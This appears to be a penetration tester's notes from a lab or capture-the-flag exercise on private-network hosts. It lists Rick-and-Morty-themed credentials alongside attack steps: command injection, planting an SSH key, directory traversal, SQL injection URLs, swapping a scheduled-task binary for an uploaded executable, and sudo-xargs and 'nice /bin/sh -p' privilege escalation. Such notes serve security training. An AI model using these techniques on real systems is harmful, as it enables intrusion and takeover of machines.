## Creds
```

FIRST BOX -- 10.50.21.90

kA2mvZmxXvN3KFh

```

## OPNOTES
```

10.50.21.90:
robots.txt -- /Onlinetools
/Onlinetools -- tools.php
tools/php -- bottom text box===cmd injection
/share/Untitled_Diagram.png -- network map + ip's

uploaded my pub ssh key to /var/www/.ssh/authorized_keys
ssh onto box as www-data
scp www-data@10.50.21.90:/var/www/html/newtest/test/automation/Automation_test.zip .
unzipped file -- auto.api.txt
auto.api.txt:
name=b3BlbnVwdGhlZG9vcgo= --- openupthedoor
sec= QjEyYzNiMzRmCg== --- B12c3b34f
login=thisaintit&password=


192.168.28.182:
robots.txt:
Disallow: /Onlinetools
Disallow: /login

/Onlinetools -- lookup.php
lookup.php -- dir traversal

/login:
login.php	2021-11-23 22:11 	691 	 
loginin.html	2021-11-23 22:11 	876

loginin.html -- POST REQ:
Msmith -> Squanchy
Fpalic -> Birdperson
Kmichae -> MrMeeseeks

/forces -- http://localhost:51001/forces/forcespick.php?Locations=4%20OR%201=1
http://localhost:51001/forces/forcespick.php?Locations=4%20UNION%20select%201,2,3,4


192.168.28.177:
CREDS: Fpalic -> Birdperson
priv esc -- sudo xargs -a /dev/null sh


```

## OPNOTES PT2
```

192.168.28.5:
CREDS -> Rsanch -- ScaryTerry
SCHEDULED TASK -> putty.exe
scp -P 51005 moveup.exe Rsanch@localhost:C:\\users\\rsanch\\desktop\\putty.exe
restart *3
hack -> admin account


192.168.28.10:
CREDS -> Kmichae -- MrMeeseeks
PRIV. ESC -> buffer overflow (exploit_this)

192.168.28.19:
CREDS -> Msmith -> Squanchy
PRIV. ESC. -> nice /bin/sh -p

```

## 
```



```

## 
```



```

